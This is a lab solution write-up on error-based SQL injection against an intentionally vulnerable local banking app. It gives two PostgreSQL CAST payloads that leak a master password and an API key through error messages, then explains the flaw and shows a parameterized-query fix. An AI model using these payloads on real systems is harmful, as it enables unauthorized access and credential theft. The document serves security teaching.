# Lab 03 Solution: BankSecure Wire Desk

## Goal

Recover these values from `bank_admin_data`:

- `db_master_password`
- `api_secret_key`

## Step 1: Confirm The Normal Lookup

Open:

```text
http://localhost:3000/lab/03-error-based/accounts
```

Search for a known account:

```text
ACC-1001
```

The app returns an active account. A missing account returns no account data.

## Step 2: Trigger A Database Error

Submit a broken quoted value:

```sql
'
```

The response shows a PostgreSQL syntax error. This confirms that user input is
being concatenated into SQL and that raw database errors are exposed.

The vulnerable query shape is:

```sql
SELECT *
FROM bank_accounts
WHERE account_number='<input>'
AND status='active';
```

## Step 3: Use CAST To Leak One Secret

Use a valid string break, a subquery, and a cast that PostgreSQL cannot complete:

```sql
' AND 1=CAST((SELECT config_value FROM bank_admin_data WHERE config_key='db_master_password') AS integer) --
```

The lookup fails, and PostgreSQL includes the secret value in the invalid integer
error.

Expected value:

```text
VaultRoot-93!transfer
```

## Step 4: Extract The API Secret

Repeat the same pattern for the API key:

```sql
' AND 1=CAST((SELECT config_value FROM bank_admin_data WHERE config_key='api_secret_key') AS integer) --
```

Expected value:

```text
sk-live-bank-xY4z8w2q-incident
```

## Why It Works

The application places input directly inside a SQL string. The payload closes
that string, adds a new condition, and comments out the trailing quote and status
check.

`CAST(... AS integer)` is intentionally given text. PostgreSQL cannot convert
that text and returns an error containing the value that failed conversion.

## Secure Fix

Use a parameterized query and return generic errors to users:

```ts
await pool.query(
  "SELECT * FROM bank_accounts WHERE account_number = $1 AND status = 'active'",
  [accountNumber]
);
```

Server logs can keep diagnostic details, but browser responses should not expose
raw database messages.
